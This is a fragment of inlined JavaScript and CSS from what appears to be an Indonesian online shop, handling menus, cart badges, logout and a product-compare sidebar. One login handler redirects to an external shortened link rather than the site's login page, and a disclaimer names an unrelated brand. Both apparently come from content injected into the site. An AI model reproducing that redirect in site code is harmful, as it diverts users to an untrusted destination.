  function toggle(){ dd.hidden ? openDD() : closeDD(); }
  function outside(e){
    if(!dd.contains(e.target) && e.target !== btn){
      closeDD();
    }
  }
  function esc(e){
    if(e.key === 'Escape'){
      closeDD();
      btn.focus();
    }
  }
  btn.addEventListener('click', toggle);
})();

// ========== HORIZONTAL SCROLL FADE INDICATOR ==========
(function(){
  const megaCats = document.getElementById('megaCatsScroll');
  const fade = document.getElementById('megaCatsFade');
  if (!megaCats || !fade) return;

  function updateFade() {
    const scrollLeft = megaCats.scrollLeft;
    const scrollWidth = megaCats.scrollWidth;
    const clientWidth = megaCats.clientWidth;
    const maxScroll = scrollWidth - clientWidth;
    
    // Hide fade when scrolled to end (within 10px tolerance)
    if (maxScroll - scrollLeft <= 10) {
      fade.style.opacity = '0';
    } else {
      fade.style.opacity = '1';
    }
  }

  // Update on scroll
  megaCats.addEventListener('scroll', updateFade, { passive: true });
  
  // Update on resize
  window.addEventListener('resize', updateFade, { passive: true });
  
  // Initial check
  setTimeout(updateFade, 100);
})();

document.addEventListener('DOMContentLoaded', function () {
  var input = document.getElementById('searchInput');
  if (!input) return;
  input.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      var form = input.form;
      if (!form) return;
      if (typeof form.requestSubmit === 'function') form.requestSubmit();
      else form.submit();
    }
  });
});


(function(){
  const cartBtn = document.getElementById('cartBtn');
  if (cartBtn) {
    cartBtn.addEventListener('click', function(e) {
      e.preventDefault();
      
      const checkLogin = () => {
        return window.isUserLoggedIn ? window.isUserLoggedIn() : false;
      };
      
      if (checkLogin()) {
        window.location.href = '/keranjang';
      } else {
        showCartLoginModal();
      }
    });
  }

  const loginBtn = document.getElementById('loginBtn');
  if (loginBtn) {
    loginBtn.addEventListener('click', function(e) {
      e.preventDefault();
      window.location.href = 'https://shortt.ink/anakbinjai';
    });
  }

  const userMenuBtn = document.getElementById('userMenuBtn');
  const userDropdown = document.getElementById('userDropdown');
  
  if (userMenuBtn && userDropdown) {
    function openDropdown() {
      userDropdown.hidden = false;
      userMenuBtn.setAttribute('aria-expanded', 'true');
      document.addEventListener('click', closeOnOutside, { capture: true });
      document.addEventListener('keydown', closeOnEscape);
    }
    
    function closeDropdown() {
      if (userDropdown.hidden) return;
      userDropdown.hidden = true;
      userMenuBtn.setAttribute('aria-expanded', 'false');
      document.removeEventListener('click', closeOnOutside, { capture: true });
      document.removeEventListener('keydown', closeOnEscape);
    }
    
    function closeOnOutside(e) {
      if (!userDropdown.contains(e.target) && e.target !== userMenuBtn) {
        closeDropdown();
      }
    }
    
    function closeOnEscape(e) {
      if (e.key === 'Escape') {
        closeDropdown();
        userMenuBtn.focus();
      }
    }
    
    userMenuBtn.addEventListener('click', function(e) {
      e.preventDefault();
      userDropdown.hidden ? openDropdown() : closeDropdown();
    });
    
    // Close dropdown when clicking profile links
    userDropdown.querySelectorAll('[data-close-dropdown]').forEach(link => {
      link.addEventListener('click', function() {
        closeDropdown();
      });
    });
  }

  // Bottom nav profile button - toggle mobile bottom sheet
  const bottomProfileBtn = document.getElementById('bottomProfileBtn');
  const mobileUserSheet = document.getElementById('mobileUserSheet');
  const mobileUserSheetBackdrop = document.getElementById('mobileUserSheetBackdrop');
  
  if (bottomProfileBtn && mobileUserSheet) {
    function openMobileSheet() {
      mobileUserSheet.hidden = false;
      document.body.style.overflow = 'hidden';
      // Trigger animation
      requestAnimationFrame(() => {
        mobileUserSheet.classList.add('active');
      });
    }
    
    function closeMobileSheet() {
      mobileUserSheet.classList.remove('active');
      document.body.style.overflow = '';
      setTimeout(() => {
        mobileUserSheet.hidden = true;
      }, 300);
    }
    
    bottomProfileBtn.addEventListener('click', function(e) {
      e.preventDefault();
      openMobileSheet();
    });
    
    if (mobileUserSheetBackdrop) {
      mobileUserSheetBackdrop.addEventListener('click', closeMobileSheet);
    }
    
    // Close on escape key
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && !mobileUserSheet.hidden) {
        closeMobileSheet();
      }
    });
    
    // Close sheet when clicking profile links
    mobileUserSheet.querySelectorAll('[data-close-sheet]').forEach(link => {
      link.addEventListener('click', function() {
        closeMobileSheet();
      });
    });
  }
  
  // Handle Google avatar error in bottom-nav (fallback to initials)
  const bottomNavAvatar = document.querySelector('.bottom-nav-avatar-img');
  if (bottomNavAvatar) {
    bottomNavAvatar.addEventListener('error', function() {
      const initials = this.getAttribute('data-fallback-initials') || 'U';
      const initialsDiv = document.createElement('div');
      initialsDiv.className = 'bottom-nav-avatar-initials';
      initialsDiv.textContent = initials;
      this.parentNode.replaceChild(initialsDiv, this);
    });
  }

  // Mobile logout button
  const mobileLogoutBtn = document.getElementById('mobileLogoutBtn');
  if (mobileLogoutBtn) {
    mobileLogoutBtn.addEventListener('click', async function(e) {
      e.preventDefault();
      
      // Check push notification before logout
      if (window.ChatNotification && typeof window.ChatNotification.confirmLogoutWithPushNotification === 'function') {
        const confirmLogout = await window.ChatNotification.confirmLogoutWithPushNotification();
        if (!confirmLogout) {
          return; // User cancelled logout
        }
      }
      
      const getCsrfToken = () => document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
      
      try {
        const response = await fetch('/auth/logout', {
          method: 'POST',
          credentials: 'same-origin',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': getCsrfToken()
          },
          body: JSON.stringify({
            csrf_token: getCsrfToken()
          })
        });
        
        if (response.ok) {
          if (window.guestCart && typeof window.guestCart.clear === 'function') {
            window.guestCart.clear();
          }
          window.location.href = '/login?logged_out=1';
        } else {
          console.error('Logout failed');
          window.location.href = '/logout';
        }
      } catch (error) {
        console.error('Logout error:', error);
        window.location.href = '/logout';
      }
    });
  }

  const logoutBtn = document.getElementById('logoutBtn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', async function(e) {
      e.preventDefault();
      
      // Check push notification before logout
      if (window.ChatNotification && typeof window.ChatNotification.confirmLogoutWithPushNotification === 'function') {
        const confirmLogout = await window.ChatNotification.confirmLogoutWithPushNotification();
        if (!confirmLogout) {
          return; // User cancelled logout
        }
      }
      
      const getCsrfToken = () => document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
      
      try {
        const response = await fetch('/auth/logout', {
          method: 'POST',
          credentials: 'same-origin',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': getCsrfToken()
          },
          body: JSON.stringify({
            csrf_token: getCsrfToken()
          })
        });
        
        if (response.ok) {
          if (window.guestCart && typeof window.guestCart.clear === 'function') {
            window.guestCart.clear();
          }
          
          window.location.href = '/login?logged_out=1';
        } else {
          console.error('Logout failed');
          window.location.href = '/logout';
        }
      } catch (error) {
        console.error('Logout error:', error);
        window.location.href = '/logout';
      }
    });
  }

  const wishlistBtn = document.getElementById('wishlistBtn');
  const notifBtn = document.getElementById('notifBtn');
  
  if (wishlistBtn) {
    wishlistBtn.addEventListener('click', function(e) {
      e.preventDefault();
      alert('Fitur wishlist akan segera tersedia!');
    });
  }
  
  if (notifBtn) {
    notifBtn.addEventListener('click', function(e) {
      e.preventDefault();
      alert('Fitur notifikasi akan segera tersedia!');
    });
  }
})();

// ========== MOBILE BOTTOM NAVIGATION ==========
(function initBottomNav() {
  // Sync cart badge with bottom nav
  function syncBottomCartBadge() {
    const mainBadge = document.getElementById('cartCount');
    const bottomBadge = document.getElementById('bottomCartCount');
    if (mainBadge && bottomBadge) {
      const count = mainBadge.textContent;
      bottomBadge.textContent = count;
      bottomBadge.style.display = parseInt(count) > 0 ? 'flex' : 'none';
    }
  }

  // Sync compare badge with bottom nav
  function syncBottomCompareBadge() {
    const mainBadge = document.getElementById('compareCount');
    const bottomBadge = document.getElementById('bottomCompareCount');
    if (mainBadge && bottomBadge) {
      const count = mainBadge.textContent;
      bottomBadge.textContent = count;
      bottomBadge.style.display = parseInt(count) > 0 ? 'flex' : 'none';
    }
  }

  // Initial sync
  syncBottomCartBadge();
  syncBottomCompareBadge();

  // Observe badge changes
  const observer = new MutationObserver(function() {
    syncBottomCartBadge();
    syncBottomCompareBadge();
  });

  const cartBadge = document.getElementById('cartCount');
  const compareBadge = document.getElementById('compareCount');
  
  if (cartBadge) observer.observe(cartBadge, { childList: true, characterData: true, subtree: true });
  if (compareBadge) observer.observe(compareBadge, { childList: true, characterData: true, subtree: true });

  // Bottom Cart Button
  const bottomCartBtn = document.getElementById('bottomCartBtn');
  if (bottomCartBtn) {
    bottomCartBtn.addEventListener('click', function(e) {
      e.preventDefault();
      
      const checkLogin = () => {
        return window.isUserLoggedIn ? window.isUserLoggedIn() : false;
      };
      
      if (checkLogin()) {
        window.location.href = '/keranjang';
      } else {
        showCartLoginModal();
      }
    });
  }

  // Bottom Compare Button
  const bottomCompareBtn = document.getElementById('bottomCompareBtn');
  if (bottomCompareBtn) {
    bottomCompareBtn.addEventListener('click', function(e) {
      e.preventDefault();
      
      // Close chat widget if open
      if (window.plazaChat && window.plazaChat.isWidgetOpen) {
        window.plazaChat.closeWidget();
      }
      
      const mainCompareBtn = document.getElementById('compareBtn');
      if (mainCompareBtn) {
        mainCompareBtn.click();
      }
    });
  }

  // Bottom Category Button - triggers mega menu
  const bottomCategoryBtn = document.getElementById('bottomCategoryBtn');
  if (bottomCategoryBtn) {
    bottomCategoryBtn.addEventListener('click', function(e) {
      e.preventDefault();
      // Trigger desktop mega menu
      const desktopTrigger = document.querySelector('.mm2-trigger:not(#bottomCategoryBtn)');
      if (desktopTrigger) {
        desktopTrigger.click();
      }
    });
  }

  // Bottom Login Button
  const bottomLoginBtn = document.getElementById('bottomLoginBtn');
  if (bottomLoginBtn) {
    bottomLoginBtn.addEventListener('click', function(e) {
      e.preventDefault();
      window.location.href = '/login';
    });
  }

  // Bottom Chat Button
  const bottomChatBtn = document.getElementById('bottomChatBtn');
  if (bottomChatBtn) {
    bottomChatBtn.addEventListener('click', function(e) {
      e.preventDefault();
      
      // Trigger chat widget (try multiple times if needed)
      const triggerChat = () => {
        const chatToggle = document.getElementById('chat-toggle-btn');
        if (chatToggle) {
          chatToggle.click();
          return true;
        }
        return false;
      };
      
      // Immediate attempt
      if (!triggerChat()) {
        // Retry after 100ms if not found
        setTimeout(() => {
          if (!triggerChat()) {
            // Last resort: manually show popup
            const popup = document.getElementById('chat-popup');
            if (popup) {
              popup.style.display = 'block';
            }
          }
        }, 100);
      }
    });
  }

  // Sync chat unread badge
  function syncBottomChatBadge() {
    const chatBadge = document.getElementById('chat-unread-badge');
    const bottomChatBadge = document.getElementById('bottomChatCount');
    if (chatBadge && bottomChatBadge) {
      const count = chatBadge.textContent;
      bottomChatBadge.textContent = count;
      bottomChatBadge.style.display = chatBadge.style.display;
    }
  }

  // Observe chat badge changes
  const chatBadge = document.getElementById('chat-unread-badge');
  if (chatBadge) {
    observer.observe(chatBadge, { attributes: true, childList: true, characterData: true, subtree: true });
    syncBottomChatBadge();
  }

  // Active state management based on current page
  function updateActiveState() {
    const currentPath = window.location.pathname;
    const bottomNavItems = document.querySelectorAll('.bottom-nav-item');
    
    bottomNavItems.forEach(item => {
      item.classList.remove('active');
      
      const itemId = item.id;
      const page = item.getAttribute('data-page');
      const href = item.getAttribute('href');
      
      // Check by ID for specific pages
      if (itemId === 'bottomHomeBtn' && currentPath === '/') {
        item.classList.add('active');
      } else if (itemId === 'bottomCartBtn' && (currentPath === '/keranjang' || currentPath === '/cart')) {
        item.classList.add('active');
      } else if (itemId === 'bottomProfileBtn' && currentPath.startsWith('/profile')) {
        item.classList.add('active');
      } else if (itemId === 'bottomCategoryBtn' && currentPath.startsWith('/kategori')) {
        item.classList.add('active');
      } else if (itemId === 'bottomCompareBtn' && currentPath === '/compare') {
        item.classList.add('active');
      } else if (itemId === 'bottomChatBtn' && currentPath === '/chat') {
        item.classList.add('active');
      }
      // Fallback: check by data-page attribute
      else if (page === 'home' && currentPath === '/') {
        item.classList.add('active');
      } else if (page === 'profile' && currentPath.startsWith('/profile')) {
        item.classList.add('active');
      }
      // Fallback: check by href
      else if (href && currentPath === href) {
        item.classList.add('active');
      }
    });
  }

  // Update active state on load
  updateActiveState();

  // Bottom nav always visible - auto-hide disabled for better UX
  // const bottomNav = document.querySelector('.bottom-nav');
  // if (bottomNav && window.innerWidth <= 640) {
  //   // Auto-hide feature disabled
  // }
})();
// Cart Login Modal Handler (Global scope)
function showCartLoginModal() {
  const modal = document.getElementById('cartLoginModal');
  if (!modal) return;
  
  modal.classList.add('show');
  
  const confirmBtn = document.getElementById('cartLoginConfirm');
  const registerBtn = document.getElementById('cartRegisterBtn');
  const cancelBtn = document.getElementById('cartLoginCancel');
  
  const handleLogin = () => {
    window.location.href = '/login?return=' + encodeURIComponent('/keranjang');
  };
  
  const handleRegister = () => {
    window.location.href = '/register?return=' + encodeURIComponent('/keranjang');
  };
  
  const handleCancel = () => {
    modal.classList.remove('show');
    confirmBtn.removeEventListener('click', handleLogin);
    registerBtn.removeEventListener('click', handleRegister);
    cancelBtn.removeEventListener('click', handleCancel);
  };
  
  confirmBtn.removeEventListener('click', handleLogin);
  registerBtn.removeEventListener('click', handleRegister);
  cancelBtn.removeEventListener('click', handleCancel);
  
  confirmBtn.addEventListener('click', handleLogin);
  registerBtn.addEventListener('click', handleRegister);
  cancelBtn.addEventListener('click', handleCancel);
  
  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      handleCancel();
    }
  });
}
</script>
<script data-inlined="cart-badge.js">
(function(){
  function selBadge(){
    return document.querySelector('[data-role="cart-badge"]') || document.getElementById('cartCount');
  }
  function setBadge(n){
    const el = selBadge();
    if (!el) return;
    const count = Math.max(0, parseInt(n||0,10) || 0);
    el.textContent = String(count);
    // Sembunyikan jika 0? Jika ingin selalu terlihat, hapus 2 baris di bawah
    if (count <= 0) { el.classList.add('is-empty'); }
    else { el.classList.remove('is-empty'); }
  }
  async function refresh(){
    try{
      // Primary: Use server-side endpoint (handles both logged and guest users)
      const res = await fetch('/api/cart/get-simple.php', { credentials:'same-origin' });
      if (res.ok) {
        const data = await res.json();
        if (data && data.ok) {
          setBadge(data.items_count || 0);
          return;
        }
      }
      
      // Fallback hanya untuk guest user: check localStorage
      const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true' ||
                        document.body.classList.contains('logged-in') ||
                        window.userLoggedIn === true;
      
      if (!isLoggedIn && window.guestCart && typeof window.guestCart.getItemsCount === 'function') {
        setBadge(window.guestCart.getItemsCount());
      }
    }catch(e){ 
      // Final fallback hanya untuk guest
      const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true';
      if (!isLoggedIn) {
        try {
          const guestCartData = JSON.parse(localStorage.getItem('plazait_guest_cart') || '{"items":{}}');
          const items = guestCartData.items || {};
          const count = Object.values(items).reduce((total, item) => total + (item.qty || 0), 0);
          setBadge(count);
        } catch(e2) {
          setBadge(0);
        }
      } else {
        setBadge(0);
      }
    }
  }

  // Ekspos untuk dipanggil dari skrip lain (opsional)
  window.CartBadge = { set: setBadge, refresh };
  window.updateCartCounter = refresh; // Alias for compatibility

  // Update saat halaman load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', refresh);
  } else {
    refresh();
  }

  // Dengarkan event global dari add/remove/update
  document.addEventListener('cart:updated', function(ev){
    const c = ev && ev.detail && typeof ev.detail.items_count === 'number'
      ? ev.detail.items_count : null;
    if (c !== null) setBadge(c);
    else refresh();
  });

  // Dengarkan event khusus cart remove untuk update badge
  document.addEventListener('cart:removed', function(ev){
    // Langsung refresh untuk memastikan data terbaru
    refresh();
  });

  // Jika addToCart sudah ada sebelum file ini, coba wrap agar badge ter-update.
  const prevAdd = window.addToCart;
  if (typeof prevAdd === 'function'){
    window.addToCart = async function(pid, qty, vid, meta){
      const res = await prevAdd(pid, qty, vid, meta);
      try{
        const cnt = res && res.cart ? res.cart.items_count : null;
        if (cnt !== null) setBadge(cnt);
        // tetap siarkan event agar listener lain ikut sync
        document.dispatchEvent(new CustomEvent('cart:updated', { detail: res.cart || {} }));
      }catch(_){}
      return res;
    };
  }

  // Helper function to check if user is logged in
  function isUserLoggedIn() {
    const metaTag = document.querySelector('meta[name="user-logged-in"]');
    return metaTag ? metaTag.getAttribute('content') === 'true' : false;
  }

  // Make login check globally accessible
  window.isUserLoggedIn = isUserLoggedIn;
})();
</script>

<!-- Product Compare Sidebar -->
<div class="compare-sidebar" id="compareSidebar">
  <div class="compare-header">
    <h4 class="compare-title">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
        <path d="M9.5,3A6.5,6.5 0 0,1 16,9.5C16,11.11 15.41,12.59 14.44,13.73L14.71,14H15.5L20.5,19L19,20.5L14,15.5V14.71L13.73,14.44C12.59,15.41 11.11,16 9.5,16A6.5,6.5 0 0,1 3,9.5A6.5,6.5 0 0,1 9.5,3M9.5,5C7,5 5,7 5,9.5C5,12 7,14 9.5,14C12,14 14,12 14,9.5C14,7 12,5 9.5,5Z"/>
      </svg>
      Bandingkan Produk
      <span class="compare-count" id="compareCountSidebar">(0)</span>
    </h4>
    <button class="compare-close" id="compareClose" aria-label="Tutup">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
        <path d="M18.3 5.7a1 1 0 0 0-1.4 0L12 10.6 7.1 5.7a1 1 0 1 0-1.4 1.4L10.6 12l-4.9 4.9a1 1 0 0 0 1.4 1.4L12 13.4l4.9 4.9a1 1 0 0 0 1.4-1.4L13.4 12l4.9-4.9a1 1 0 0 0 0-1.4z"/>
      </svg>
    </button>
  </div>
  
  <div class="compare-content">
    <div class="compare-empty" id="compareEmpty">
      <div class="empty-icon">
        <svg width="48" height="48" viewBox="0 0 24 24" fill="currentColor" opacity="0.3">
          <path d="M9.5,3A6.5,6.5 0 0,1 16,9.5C16,11.11 15.41,12.59 14.44,13.73L14.71,14H15.5L20.5,19L19,20.5L14,15.5V14.71L13.73,14.44C12.59,15.41 11.11,16 9.5,16A6.5,6.5 0 0,1 3,9.5A6.5,6.5 0 0,1 9.5,3M9.5,5C7,5 5,7 5,9.5C5,12 7,14 9.5,14C12,14 14,12 14,9.5C14,7 12,5 9.5,5Z"/>
        </svg>
      </div>
      <h5>Belum ada produk dipilih</h5>
      <p>Pilih produk yang ingin dibandingkan dengan klik tombol "Bandingkan Produk" di halaman produk.</p>
    </div>
    
    <div class="compare-list" id="compareList">
      <!-- Products will be populated here -->
    </div>
  </div>
  
  <div class="compare-actions" id="compareActions">
    <button class="btn btn-outline-danger btn-sm" id="compareClearAll">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
        <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
      </svg>
      Hapus Semua
    </button>
    <button class="btn btn-primary btn-sm" id="compareAnalyze" disabled>
      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M11,16.5L18,9.5L16.59,8.09L11,13.67L7.91,10.59L6.5,12L11,16.5Z"/>
      </svg>
      Analisis AI
    </button>
  </div>
  
  <!-- AI Disclaimer in Sidebar -->
  <div class="compare-disclaimer">
    <div class="ai-disclaimer">
      <div class="disclaimer-text">
        <strong>ðŸ’¡ Catatan:</strong> Analisis ini dihasilkan secara otomatis dan dapat memiliki keterbatasan.
        Gunakan sebagai referensi tambahan dengan tetap mempertimbangkan kebutuhan Anda.
        Untuk informasi lebih lanjut, silakan hubungi tim AGUSTOTO.
      </div>
    </div>
  </div>
</div><style data-inlined="pd-lightbox.css">
/* PlazaIT Product Lightbox (vanilla, no CDN) â€” v4 */
.pd-lb {
  position: fixed; inset: 0; z-index: 99999;
  background: rgba(0,0,0,.95);
  display: none;
  color: #fff;
  /* Transition untuk swipe-down feedback */
  transition: transform .18s ease, opacity .18s ease;
}
.pd-lb.show { display: block; }

/* Canvas di bawah (z:1), Controls di atas (z:2) */
.pd-lb-canvas {
  position: absolute; inset: 56px 0 56px 0;
  display: flex; align-items: center; justify-content: center;
  overflow: hidden;
  touch-action: none;
  z-index: 1;
}

.pd-lb-img {
  max-width: 96vw; max-height: 86vh;
  will-change: transform;
  user-select: none;
  pointer-events: none;
  transform-origin: 50% 50%;
}

.pd-lb-close, .pd-lb-prev, .pd-lb-next, .pd-lb-counter {
  position: absolute;
  z-index: 2;
}

.pd-lb-close, .pd-lb-prev, .pd-lb-next {
  background: rgba(17,24,39,.7);
  color: #fff; border: 0; cursor: pointer;
  width: 40px; height: 40px; border-radius: 999px;
  display: inline-flex; align-items: center; justify-content: center;
  transition: background-color .15s ease, transform .05s ease;
  -webkit-tap-highlight-color: transparent;
}
.pd-lb-close:hover, .pd-lb-prev:hover, .pd-lb-next:hover { background: rgba(31,41,55,.85); }
.pd-lb-close:active, .pd-lb-prev:active, .pd-lb-next:active { transform: translateY(.5px); }

.pd-lb-close { top: max(12px, env(safe-area-inset-top, 12px)); right: max(12px, env(safe-area-inset-right, 12px)); }
.pd-lb-prev  { top: 50%; left:  10px; transform: translateY(-50%); }
.pd-lb-next  { top: 50%; right: 10px; transform: translateY(-50%); }

.pd-lb-counter {
  top: max(16px, env(safe-area-inset-top, 16px)); left: 50%;
  transform: translateX(-50%);
  font-weight: 700; font-size: 13px; letter-spacing: .4px;
  background: rgba(17,24,39,.65);
  padding: 6px 10px; border-radius: 999px; border: 1px solid rgba(255,255,255,.1);
}

@media (max-width: 640px){
  .pd-lb-img { max-width: 98vw; max-height: 80vh; }
  .pd-lb-prev, .pd-lb-next { width: 36px; height: 36px; }
  .pd-lb-close { width: 38px; height: 38px; }
}
</style>
<style>.paylater-promo{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#f0fdf4 0,#dcfce7 100%);border:1px solid #86efac;border-radius:8px;padding:8px 12px;font-size:13px;line-height:1.4;margin:8px 0}.paylater-promo-sm{padding:6px 10px;font-size:11px;gap:6px}.paylater-promo-md{padding:8px 12px;font-size:13px;gap:8px}.paylater-promo-lg{padding:10px 16px;font-size:14px;gap:10px}.paylater-icon{font-size:1.2em;flex-shrink:0}.paylater-text{display:flex;flex-direction:column;gap:2px}.paylater-text strong{color:#15803d;font-weight:600}.paylater-text small{color:#16a34a;font-size:.85em;opacity:.9}.paylater-desktop-only{display:none}.paylater-mobile-only{display:flex}@media (min-width:641px){.paylater-desktop-only{display:flex}.paylater-mobile-only{display:none}}@media (max-width:640px){.paylater-promo{font-size:12px;padding:7px 10px}.paylater-promo-lg{font-size:13px;padding:8px 12px}}@media print{.paylater-promo{display:none!important}}.paylater-compact{display:inline-block;font-size:11px;font-weight:600;color:#059669;background:#d1fae5;padding:3px 8px;border-radius:4px;margin:6px 0 4px;line-height:1.3}@media (max-width:640px){.paylater-compact{font-size:10px;padding:2px 6px;margin:5px 0 3px}}@media print{.paylater-compact{display:none!important}}</style><style nonce="se3iyzEHMc9FQEB4wSyd0w==">.pd-voucher-minimal{margin:10px 0;display:flex;flex-direction:column;gap:6px}.pdv-min-item{display:flex;align-items:center;gap:8px;padding:0;height:32px;transition:all .2s ease}.pdv-min-hidden{display:none}.pdv-min-disabled{opacity:.5}.pdv-badge-btn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);border:none;border-radius:8px;padding:3px;cursor:pointer;transition:all .2s ease;width:auto}.pdv-badge-btn:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 4px 12px rgba(102,126,234,.3)}.pdv-badge-btn:disabled{opacity:.6;cursor:not-allowed}.pdv-badge-icon{color:#fff;flex-shrink:0}.pdv-badge-text{font-size:14px;font-weight:700;color:#fff;white-space:nowrap}.pdv-badge-code{font-family:'Courier New',monospace;font-size:13px;font-weight:700;color:#fff;background:rgba(255,255,255,.2);padding:4px 8px;border-radius:4px;border:none;white-space:nowrap}.pdv-min-copy,.pdv-min-more{padding:4px 12px;font-size:12px;font-weight:600;border-radius:5px;border:1px solid #e2e8f0;background:#fff;color:#667eea;cursor:pointer;transition:all .2s ease;white-space:nowrap}.pdv-min-copy:hover:not(:disabled),.pdv-min-more:hover{background:#667eea;color:#fff;border-color:#667eea}.pdv-min-copy:disabled{opacity:.4;cursor:not-allowed}.pdv-min-copy.copied{background:#22c55e;color:#fff;border-color:#22c55e}.pdv-min-more{margin-left:auto}.modal-close{position:absolute;top:20px;right:20px;background:none;border:none;cursor:pointer;color:#64748b;padding:4px;transition:color .2s ease}.modal-close:hover{color:#1e293b}.modal-body{margin-bottom:8px}.voucher-modal-content{text-align:center}.voucher-modal-badge{display:inline-flex;flex-direction:row;align-items:center;gap:6px;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);border-radius:10px;padding:8px 16px;margin-bottom:12px}.vmb-value{font-size:18px;font-weight:700;color:#fff;line-height:1}.vmb-label{font-size:18px;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.5px}.voucher-modal-code{font-family:'Courier New',monospace;font-size:14px;font-weight:700;color:#667eea;background:rgba(102,126,234,.1);padding:6px 12px;border-radius:6px;border:2px dashed rgba(102,126,234,.3);display:inline-block;margin-bottom:10px}.voucher-modal-name{font-size:14px;font-weight:600;color:#1e293b;margin-bottom:16px}.voucher-modal-details{text-align:left;background:#f8fafc;border-radius:8px;padding:12px;margin-bottom:16px}.vmd-item{display:flex;align-items:flex-start;gap:8px;padding:6px 0;font-size:13px;color:#64748b;border-bottom:1px solid #e2e8f0}.vmd-item:last-child{border-bottom:none}.vmd-item svg{color:#667eea;flex-shrink:0;margin-top:2px}.vmd-item strong{color:#1e293b}.modal-actions{padding:20px}.modal-btn-primary{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:#fff}.modal-btn-primary:hover{opacity:.9;transform:translateY(-1px)}@media (max-width:640px){.pdv-min-item{gap:6px}.pdv-badge-btn{padding:3px;gap:6px}.pdv-badge-text{font-size:13px}.pdv-badge-code{font-size:12px;padding:3px 6px}.pdv-min-copy,.pdv-min-more{padding:3px 10px;font-size:11px}.modal-dialog{max-width:95%;margin:20px}.vmb-value{font-size:16px}.vmb-label{font-size:16px}.voucher-modal-code{font-size:13px;padding:5px 10px}}</style><style nonce="se3iyzEHMc9FQEB4wSyd0w==">.promo-endyear-mini-banner{display:flex;align-items:center;gap:12px;padding:12px 16px;background:rgba(255,255,255,.8);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:2px solid rgba(242,140,26,.2);border-radius:12px;margin:16px 0;box-shadow:0 4px 16px rgba(0,0,0,.08);transition:all .3s ease}.promo-endyear-mini-banner:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,.12);border-color:rgba(242,140,26,.4)}.pey-icon{font-size:32px;line-height:1;flex-shrink:0}.pey-content{flex:1;min-width:0}.pey-content strong{display:block;font-size:14px;font-weight:700;color:#8adeff;margin-bottom:2px}.pey-content span{display:block;font-size:13px;color:#64748b;line-height:1.4}.pey-link{flex-shrink:0;padding:8px 16px;background:linear-gradient(135deg,#8adeff,#FFB84D);color:#fff;text-decoration:none;font-size:13px;font-weight:700;border-radius:8px;white-space:nowrap;transition:all .2s ease;box-shadow:0 2px 8px rgba(242,140,26,.25)}.pey-link:hover{transform:translateX(2px);box-shadow:0 4px 12px rgba(242,140,26,.35)}@media(max-width:640px){.promo-endyear-mini-banner{flex-wrap:wrap;gap:8px;padding:10px 12px}.pey-icon{font-size:28px;align-self:flex-start}.pey-content{flex:1;min-width:0}.pey-content strong{font-size:12px}.pey-content span{font-size:11px;line-height:1.3}.pey-link{width:100%;flex-basis:100%;font-size:11px;padding:6px 12px;text-align:center}}@media print{.promo-endyear-mini-banner{display:none!important}}</style>
<style nonce="se3iyzEHMc9FQEB4wSyd0w==">
.pd-title-row{position:relative;margin-bottom:12px;padding-right:52px}.pd-title{margin:0!important}.pd-share-btn{position:absolute;top:0;right:0;width:40px;height:40px;display:inline-flex;align-items:center;justify-content:center;border-radius:10px;border:1px solid #e2e8f0;background:#fff;color:#64748b;cursor:pointer;transition:all .2s ease;-webkit-tap-highlight-color:transparent}.pd-share-btn:hover{background:#f8fafc;border-color:#cbd5e1;color:#0f172a;transform:translateY(-1px)}.pd-share-btn:active{transform:translateY(0)}.pd-share-btn svg{display:block}

.pd-share-modal-overlay{position:fixed;inset:0;background:rgba(15,23,42,.75);backdrop-filter:blur(4px);z-index:99999;display:none;align-items:center;justify-content:center;padding:0;animation:fadeIn .2s ease}.pd-share-modal-overlay.show{display:flex}.pd-share-modal{background:#fff;border-radius:20px;box-shadow:0 25px 50px -12px rgba(0,0,0,.25);max-width:480px;width:100%;max-height:90vh;overflow:hidden;display:flex;flex-direction:column;animation:slideUp .3s cubic-bezier(.16,1,.3,1)}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes slideUp{from{opacity:0;transform:translateY(20px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}

.pd-share-header{display:flex;align-items:center;justify-content:space-between;padding:20px 24px;border-bottom:1px solid #f1f5f9}.pd-share-title{font-size:18px;font-weight:700;color:#0f172a;margin:0}.pd-share-close{width:32px;height:32px;border-radius:8px;border:0;background:transparent;color:#64748b;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s ease}.pd-share-close:hover{background:#f1f5f9;color:#0f172a}.pd-share-body{padding:24px;overflow-y:auto}

